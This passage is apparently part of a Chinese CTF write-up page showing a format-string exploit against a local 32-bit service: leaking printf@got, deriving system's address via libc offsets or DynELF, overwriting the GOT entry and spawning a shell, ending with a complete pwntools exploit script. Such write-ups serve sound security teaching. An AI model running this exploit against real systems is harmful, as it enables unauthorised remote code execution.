+        :   ;-- imp.printf:                                                                                                                                                           
+        :   0x08048400      ff2574990408   jmp dword [reloc.printf_116] ; 0x8049974                                                                                                   
+        :   0x08048406      6808000000     push 8                      ; 8                                                                                                            
+        `=&lt; 0x0804840b      e9d0ffffff     jmp 0x80483e0
+</pre></div>
+地址为 <code>0x8049974</code>。</p>
+<h4 id="printf-address-system-address">printf address &amp; system address<a class="headerlink" href="#printf-address-system-address" title="Permanent link">&para;</a></h4>
+<p>接下来通过 printf@got 泄露出 printf 的地址，进行到这儿，就有两种方式要考虑了，即我们是否可以拿到 libc，如果能，就很简单了。如果不能，就需要使用 DynELF 进行无 libc 的利用。</p>
+<p>先说第一种：
+<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_printf_addr</span><span class="p">():</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="s1">&#39;10001&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;%9$s.AAA&quot;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;.AAA&quot;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">]</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;printf address: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">data</span>
+<span class="n">printf_addr</span> <span class="o">=</span> <span class="n">get_printf_addr</span><span class="p">()</span>
+</pre></div>
+<div class="codehilite"><pre><span></span>[*] printf address: 70e6e0f7
+</pre></div>
+所以 printf 的地址是 <code>0xf7e0e670</code>（小端序），使用 libc-database 查询得到 libc.so，然后可以得到 printf 和 system 的相对位置。
+<div class="codehilite"><pre><span></span>$ ./find printf 670
+ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu9_i386)
+/usr/lib32/libc-2.26.so (id local-292a64d65098446389a47cdacdf5781255a95098)
+$ ./dump local-292a64d65098446389a47cdacdf5781255a95098 printf system
+offset_printf = 0x00051670
+offset_system = 0x0003cc50
+</pre></div>
+然后计算得到 printf 的地址：
+<div class="codehilite"><pre><span></span><span class="n">printf_addr</span> <span class="o">=</span> <span class="mh">0xf7e0e670</span>
+<span class="n">offset_printf</span> <span class="o">=</span> <span class="mh">0x00051670</span>
+<span class="n">offset_system</span> <span class="o">=</span> <span class="mh">0x0003cc50</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">printf_addr</span> <span class="o">-</span> <span class="p">(</span><span class="n">offset_printf</span> <span class="o">-</span> <span class="n">offset_system</span><span class="p">)</span>
+</pre></div></p>
+<p>第二种方法是使用 DynELF 模块来泄露函数地址：
+<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="s1">&#39;10001&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;%9$s.AAA&quot;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;.AAA&quot;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leaking: 0x</span><span class="si">%x</span><span class="s2"> --&gt; </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">data</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">DynELF</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mh">0x08048490</span><span class="p">)</span>     <span class="c1"># Entry point address</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;libc&#39;</span><span class="p">)</span>
+<span class="n">printf_addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="s1">&#39;printf&#39;</span><span class="p">,</span> <span class="s1">&#39;libc&#39;</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;system address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">system_addr</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;printf address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">printf_addr</span><span class="p">)</span>
+</pre></div>
+<div class="codehilite"><pre><span></span>[*] system address: 0xf7df9c50
+[*] printf address: 0xf7e0e670
+</pre></div>
+DynELF 不要求我们拿到 libc.so，所以如果我们查询不到 libc.so 的版本信息，该模块就能发挥它最大的作用。</p>
+<h4 id="attack">attack<a class="headerlink" href="#attack" title="Permanent link">&para;</a></h4>
+<p>按照格式化字符串漏洞的套路，我们通过任意写将 printf@got 指向的内存覆盖为 system 的地址，然后发送字符串 <code>/bin/sh</code>，就可以在调用 <code>printf(&quot;/bin/sh&quot;)</code> 的时候实际上调用 <code>system(&quot;/bin/sh&quot;)</code>。</p>
+<p>终极 payload 如下，使用 <code>fmtstr_payload</code> 函数来自动构造，将：
+<div class="codehilite"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">})</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="s1">&#39;10001&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+虽说有这样的自动化函数很方便，基本的手工构造还是要懂的，看一下生成的 payload 长什么样子：
+<div class="codehilite"><pre><span></span>[DEBUG] Sent 0x3a bytes:
+    00000000  74 99 04 08  75 99 04 08  76 99 04 08  77 99 04 08  │t···│u···│v···│w···│
+    00000010  25 36 34 63  25 37 24 68  68 6e 25 37  36 63 25 38  │%64c│%7$h│hn%7│6c%8│
+    00000020  24 68 68 6e  25 36 37 63  25 39 24 68  68 6e 25 32  │$hhn│%67c│%9$h│hn%2│
+    00000030  34 63 25 31  30 24 68 68  6e 0a                     │4c%1│0$hh│n·│
+    0000003a
+</pre></div>
+开头是 printf@got 地址，四个字节分别位于：
+<div class="codehilite"><pre><span></span>0x08049974
+0x08049975
+0x08049976
+0x08049977
+</pre></div>
+然后是格式字符串 <code>%64c%7$hhn%76c%8hhn%67c%9$hhn%24c%10$hhn</code>：
+<div class="codehilite"><pre><span></span>16  + 64 = 80  = 0x50
+80  + 76 = 156 = 0x9c
+156 + 67 = 223 = 0xdf
+233 + 24 = 247 = 0xf7
+</pre></div>
+就这样将 system 的地址写入了内存。</p>
+<p>Bingo!!!
+<div class="codehilite"><pre><span></span>$ python2 exp.py
+[+] Opening connection to 127.0.0.2 on port 10001: Done
+[*] Switching to interactive mode
+$ whoami
+firmy
+</pre></div></p>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p>完整的 exp 如下：
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># context.log_level = &#39;debug&#39;</span>
+
+<span class="k">def</span> <span class="nf">exec_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">info</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">info</span>
+<span class="c1"># p = remote(&#39;127.0.0.1&#39;, &#39;10001&#39;)</span>
+<span class="c1"># p.recvline()</span>
+<span class="c1"># auto = FmtStr(exec_fmt)</span>
+<span class="c1"># offset = auto.offset</span>
+<span class="c1"># p.close()</span>
+
+<span class="k">def</span> <span class="nf">dump_memory</span><span class="p">(</span><span class="n">start_addr</span><span class="p">,</span> <span class="n">end_addr</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">while</span> <span class="n">start_addr</span> <span class="o">&lt;</span> <span class="n">end_addr</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="s1">&#39;10001&#39;</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+        <span class="c1"># print result.encode(&#39;hex&#39;)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;%9$s.AAA&quot;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;.AAA&quot;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+        <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leaking: 0x</span><span class="si">%x</span><span class="s2"> --&gt; </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">start_addr</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)))</span>
+        <span class="n">result</span> <span class="o">+=</span> <span class="n">data</span>
+        <span class="n">start_addr</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">result</span>
+<span class="c1"># start_addr = 0x8048000</span>
+<span class="c1"># end_addr   = 0x8049000</span>
+<span class="c1"># code_bin = dump_memory(start_addr, end_addr)</span>
+<span class="c1"># with open(&quot;code.bin&quot;, &quot;wb&quot;) as f:</span>
+<span class="c1">#     f.write(code_bin)</span>
+<span class="c1">#     f.close()</span>
+<span class="n">printf_got</span> <span class="o">=</span> <span class="mh">0x8049974</span>
+
+<span class="c1">## method 1</span>
+<span class="k">def</span> <span class="nf">get_printf_addr</span><span class="p">():</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="s1">&#39;10001&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;%9$s.AAA&quot;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;.AAA&quot;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">]</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;printf address: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">data</span>
+<span class="c1"># printf_addr = get_printf_addr()</span>
+<span class="n">printf_addr</span> <span class="o">=</span> <span class="mh">0xf7e0e670</span>
+<span class="n">offset_printf</span> <span class="o">=</span> <span class="mh">0x00051670</span>
+<span class="n">offset_system</span> <span class="o">=</span> <span class="mh">0x0003cc50</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">printf_addr</span> <span class="o">-</span> <span class="p">(</span><span class="n">offset_printf</span> <span class="o">-</span> <span class="n">offset_system</span><span class="p">)</span>
+
+<span class="c1">## method 2</span>
+<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="s1">&#39;10001&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;%9$s.AAA&quot;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;.AAA&quot;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leaking: 0x</span><span class="si">%x</span><span class="s2"> --&gt; </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">data</span>
+<span class="c1"># data = DynELF(leak, 0x08048490)     # Entry point address</span>
+<span class="c1"># system_addr = data.lookup(&#39;system&#39;, &#39;libc&#39;)</span>
+<span class="c1"># printf_addr = data.lookup(&#39;printf&#39;, &#39;libc&#39;)</span>
+<span class="c1"># log.info(&quot;system address: 0x%x&quot; % system_addr)</span>
+<span class="c1"># log.info(&quot;printf address: 0x%x&quot; % printf_addr)</span>
+
+<span class="c1">## get shell</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">})</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.1.1&#39;</span><span class="p">,</span> <span class="s1">&#39;10001&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div></p>
+<h2 id="_3">参考资料<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://paper.seebug.org/246/">Linux系统下格式化字符串利用研究</a></li>
+<li><a href="http://bruce30262.logdown.com/posts/1255979-33c3-ctf-2016-espr">33C3 CTF 2016 -- ESPR</a></li>
+</ul>
+                
+                  
+                
+              
+              
+                
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../6.1.1_pwn_hctf2016_brop/" title="HCTF2016 brop" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  后退
+                </span>
+                HCTF2016 brop
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../6.1.3_pwn_xdctf2015_pwn200/" title="XDCTF2015 pwn200" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  前进
+                </span>
+                XDCTF2015 pwn200
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="http://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/application.02434462.js"></script>
+      
+        
+        
+          
+          <script src="../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../../../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../../../assets/javascripts/lunr/lunr.jp.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"0.17.2",url:{base:"../../.."}})</script>
+      
+        <script src="../../../_static/js/extra.js"></script>
+      
+        <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+    
+      
+    
+  </body>
+</html>
